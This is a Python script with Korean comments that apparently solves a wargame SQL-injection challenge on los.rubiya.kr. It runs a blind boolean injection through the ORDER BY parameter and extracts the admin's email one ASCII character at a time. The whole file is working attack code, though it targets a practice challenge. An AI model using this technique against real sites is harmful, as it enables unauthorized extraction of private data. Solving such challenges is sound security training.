# made by TOR
# pw.py version 2.7

import urllib.request
from urllib.parse import quote

all_location = [] # 전체 이메일 글자와 위치를 저장할 리스트 선언
email = [] # 이메일을 저장할 리스트 선언

# 이메일의 길이가 28이므로 크게 이중 for문을 
# 33 ~ 127 까지 아스키 코드 값을 반복함
for j in range(1, 29, 1):
            for i in range(33,129,1):
                        
                        # 사용할 쿼리 제작 
                        url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php?order="
                        query = "(id='admin' and ascii(substr(email,"+str(j)+",1))="+str(i)+") desc"
                        query = quote(query)
                        new_url = url + query
                        
                        # 쿠키 값 추가 해줌
                        req = urllib.request.Request(new_url)
                        req.add_header("Cookie", "<자신의 쿠키값>")
                        response = urllib.request.urlopen(req)
                        
                        # 서버가 응답한 데이터를 받아들임, 그 후 조건 실행
                        # query가 포함된 경우 참인 조건 
                        # <참고> 포함 : != -1 / 포함X : == -1 
                        # 위치와 글자를 찾아 리스트에 저장후 정지
                        if str(response.read()).find("<th>score</th><tr><td>admin</td>") != -1:
                                    location = [] # 각 글자의 이메일 글자와 위치를 저장할 리스트 선언
                                    print("Found length!! =>"+str(chr(i)))
                                    location.append(str(chr(i)))
                                    location.append(j)   
                                    all_location.append(location)
                                    email.append(str(chr(i)))            
                                    break
                                                            
                        else:
                                    print("{}".format(i))
      
print("Finish")
print(all_location)
print("eamil:", email)
